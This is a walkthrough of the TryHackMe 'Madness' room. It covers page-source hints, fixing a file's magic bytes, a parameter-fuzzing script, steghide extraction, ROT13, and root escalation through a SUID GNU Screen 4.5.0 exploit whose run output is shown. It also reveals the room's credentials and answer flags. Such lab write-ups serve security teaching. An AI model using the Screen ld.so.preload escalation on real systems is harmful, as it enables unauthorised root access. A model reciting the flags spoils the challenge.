# Madness — TryHackMe Walkthrough

> Will you be consumed by Madness? Use your skills to access the user and root account!

<p align="center">
 <a href="https://ibb.co/FkrFRjp5"><img src="https://i.ibb.co/1YgkFwcr/da5401c2a6e6d3aabfc379cb214d8cb2.png" alt="da5401c2a6e6d3aabfc379cb214d8cb2" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/madness">
    <img src="https://img.shields.io/badge/TryHackMe-Madness-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Stego%20%7C%20Python%20Fuzzing%20%7C%20File%20Forensics%20%7C%20SUID-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Web Poking — Page Source and Image Analysis |
| 2 | Reverse Engineering — File Magic Bytes |
| 3 | Python Scripting — Parameter Fuzzing |
| 4 | Steganography — Extracting Hidden Data |
| 5 | Cryptography — ROT13 |
| 6 | Abusing SUID — GNU Screen 4.5.0 (CVE) |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Inspect page source and identify embedded images for further analysis
- Identify and fix incorrect file magic bytes using `xxd` and `dd`
- Write a Python script to fuzz a URL parameter and find a hidden secret
- Use `steghide` to extract data hidden inside image files
- Decode ROT13-encoded text to reveal a username
- Find and exploit a SUID binary vulnerable to local privilege escalation

---

## Prerequisites

- Basic familiarity with Linux terminal commands and Python 3
- `xxd`, `dd`, `steghide`, and John the Ripper installed
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)
- Note: This challenge does not require SSH brute forcing

---

## Task 1 — Flag Submission

---

### Step 1 — Page Source Inspection and Image Download

**Approach:** View the page source of the homepage. An image called `thm.jpg` is embedded with a suspicious comment nearby. Download the image for further analysis.

Page source reveals:

```html
<img src="thm.jpg" class="floating_element" />
<!-- They will never find me-->
```

```
wget http://Machine_IP/thm.jpg
```

> **Note:** The HTML comment `<!-- They will never find me-->` is a direct hint that something is hidden on the page. The image `thm.jpg` is the primary object of interest. Always view page source before doing anything else — developers frequently leave clues in HTML comments.

---

### Step 2 — Fixing the Image Magic Bytes

**Approach:** Inspect the first bytes of `thm.jpg` using `xxd`. Compare the file signature against known formats to identify what the file actually is, then fix the header.

```
kali@kali:~/CTFs/tryhackme/Madness$ xxd thm.jpg | head
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0003 0202 0302 0203  .......C........
00000020: 0303 0304 0303 0405 0805 0504 0405 0a07  ................
```

> **Note:** The file is named `.jpg` but the first bytes are `89 50 4E 47 0D 0A 1A 0A` — the magic bytes for a **PNG** file. A real JPEG starts with `FF D8 FF E0 00 10 4A 46 49 46 00 01`. The magic bytes are the first few bytes of a file that identify its format to the operating system and tools. By overwriting the incorrect PNG header with the correct JPEG header, the file becomes a valid JPEG that can be opened and processed by tools like `steghide`.

Fix the magic bytes with `dd`:

```
kali@kali:~/CTFs/tryhackme/Madness$ printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
12+0 records in
12+0 records out
12 bytes copied, 8.2589e-05 s, 145 kB/s
```

> **Note:** `dd conv=notrunc` writes the bytes to the file without truncating it — only the first 12 bytes are overwritten with the correct JPEG signature. After this fix, opening the image in a viewer reveals a hidden path: **`/th1s_1s_h1dd3n`**.

---

### Step 3 — Fuzzing the Hidden Directory with Python

**Approach:** Navigate to `http://Machine_IP/th1s_1s_h1dd3n/`. The page asks for a `secret` parameter and responds with "That is wrong!" for incorrect values. Write a Python script to fuzz all values from 0 to 99.

```python
#!/usr/bin/env python3

import requests

host = 'Machine_IP'
url = 'http://{}/th1s_1s_h1dd3n/?secret={}'

for i in range(100):
    r = requests.get(url.format(host, i))
    if not 'That is wrong!' in r.text:
        print("Found secret: {}".format(i))
        print(r.text)
```

```
kali@kali:~/CTFs/tryhackme/Madness$ python3 hidden_secret.py
Found secret: 73
```

Response HTML when the correct secret is found:

```html
<html>
  <head>
    <title>Hidden Directory</title>
  </head>
  <body>
    <div class="main">
      <h2>Welcome! I have been expecting you!</h2>
      <p>To obtain my identity you need to guess my secret!</p>
      <!-- It's between 0-99 but I don't think anyone will look here-->
      <p>Secret Entered: 73</p>
      <p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>
    </div>
  </body>
</html>
```

> **Note:** The script checks each response for the absence of "That is wrong!" — a negative match approach that is cleaner than trying to detect a success message when its exact wording is unknown. The correct secret is **`73`**, which reveals a passphrase: **`y2RPJ4QaPF!B`**. This will be used as the `steghide` passphrase to extract hidden data from the image.

---

### Step 4 — Extracting Hidden Data from the Image with Steghide

**Approach:** Use `steghide` with the passphrase found from the hidden directory to extract data embedded inside `thm.jpg`.

```
kali@kali:~/CTFs/tryhackme/Madness$ steghide extract -sf thm.jpg
Enter passphrase:
wrote extracted data to "hidden.txt".
kali@kali:~/CTFs/tryhackme/Madness$ cat hidden.txt
Fine you found the password!

Here's a username

wbxre

I didn't say I would make it easy for you!
```

> **Note:** `steghide` extracts data that has been hidden inside the JPEG image using the passphrase `y2RPJ4QaPF!B`. The extracted file contains a username — but it is encoded. The string **`wbxre`** is encoded with **ROT13** — a simple substitution cipher that shifts each letter 13 positions in the alphabet. Decode it with `tr`.

```
kali@kali:~/CTFs/tryhackme/Madness$ echo -n "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
joker
```

> **Note:** The decoded username is **`joker`**. The room also has a second image (accessible from the SMB share or another discovered path) that contains the password via steghide.

---

### Step 5 — Extracting the Password from a Second Image

**Approach:** A second image file is accessible on the server. Use `steghide` on it with the same passphrase to extract the password for the `joker` SSH account.

```
kali@kali:~/CTFs/tryhackme/Madness$ steghide extract -sf 5iW7kC8.jpg
Enter passphrase:
wrote extracted data to "password.txt".
kali@kali:~/CTFs/tryhackme/Madness$ cat password.txt
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```

> **Note:** The SSH password for user `joker` is **`*axA&GF8dP`**. With both the username and password recovered, SSH login is now possible.

---

### Step 6 — SSH Login and Reading the User Flag

**Approach:** Log in via SSH as `joker` using the extracted password.

```
kali@kali:~/CTFs/tryhackme/Madness$ ssh joker@Machine_IP
joker@Machine_IP's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
joker@ubuntu:~$ ls -la
total 20
drwxr-xr-x 3 joker joker 4096 Oct 14 03:08 .
drwxr-xr-x 3 root  root  4096 Jan  4  2020 ..
-rw------- 1 joker joker    0 Jan  5  2020 .bash_history
-rw-r--r-- 1 joker joker 3771 Jan  4  2020 .bashrc
drwx------ 2 joker joker 4096 Oct 14 03:08 .cache
-rw-r--r-- 1 root  root    38 Jan  6  2020 user.txt
joker@ubuntu:~$ cat user.txt
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

> **Note:** The user flag is in `joker`'s home directory, owned by root but world-readable. The `.bash_history` is empty (linked to `/dev/null`), which is a common countermeasure to prevent post-exploitation history analysis.

---

### Question 1 — user.txt

<details>
<summary>Reveal Answer</summary>

**`THM{d5781e53b130efe2f94f9b0354a5e4ea}`**

</details>

---

### Step 7 — Privilege Escalation via GNU Screen 4.5.0

**Approach:** Search for SUID binaries. Identify any unusual ones and look them up on Exploit-DB for known vulnerabilities.

```
joker@ubuntu:~$ find / -user root -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
joker@ubuntu:~$ ls -l /bin/screen*
lrwxrwxrwx 1 root root      12 Jan  4  2020 /bin/screen -> screen-4.5.0
-rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0
-rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0.old
lrwxrwxrwx 1 root root      12 Jan  4  2020 /bin/screen.old -> screen-4.5.0
```

> **Note:** `/bin/screen-4.5.0` has the SUID bit set and is owned by root. **GNU Screen 4.5.0** has a known local privilege escalation vulnerability documented at [Exploit-DB #41154](https://www.exploit-db.com/exploits/41154). The exploit works by compiling a malicious shared library and a root shell binary, then using Screen's `ld.so.preload` injection to load the library during a privileged Screen session — which executes the payload as root. Download the exploit script to `/tmp` on the target and run it.

```
joker@ubuntu:/tmp$ sh 41154.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function 'dropshell':
/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod' [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
/tmp/rootshell.c: In function 'main':
/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid' [-Wimplicit-function-declaration]
     setuid(0);
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.

# id
uid=0(root) gid=0(root) groups=0(root),1000(joker)
# cat /root/root.txt
THM{5ecd98aa66a6abb670184d7547c8124a}
```

> **Note:** The compiler warnings during exploit execution are harmless — they are implicit declaration warnings from the C compiler and do not affect the exploit. The `#` prompt confirms root access. The `id` output shows `uid=0(root)`, confirming full privilege escalation. The root flag is found in `/root/root.txt`.

---

### Question 2 — root.txt

<details>
<summary>Reveal Answer</summary>

**`THM{5ecd98aa66a6abb670184d7547c8124a}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Page source inspection | Found `thm.jpg` and HTML comment hint |
| 2 | `xxd` magic byte analysis | Discovered `thm.jpg` has PNG header instead of JPEG |
| 3 | `dd` magic byte fix | Corrected JPEG header, image revealed hidden path `/th1s_1s_h1dd3n` |
| 4 | Python fuzzing script (0–99) | Found secret value `73`, revealed steghide passphrase `y2RPJ4QaPF!B` |
| 5 | `steghide extract` on `thm.jpg` | Extracted `hidden.txt` containing ROT13-encoded username `wbxre` |
| 6 | ROT13 decode with `tr` | Decoded username → `joker` |
| 7 | `steghide extract` on second image | Extracted SSH password `*axA&GF8dP` |
| 8 | SSH login as `joker` | Gained shell access, read `user.txt` |
| 9 | SUID binary search | Found `/bin/screen-4.5.0` with SUID bit |
| 10 | GNU Screen 4.5.0 exploit (Exploit-DB #41154) | Gained root shell, read `root.txt` |
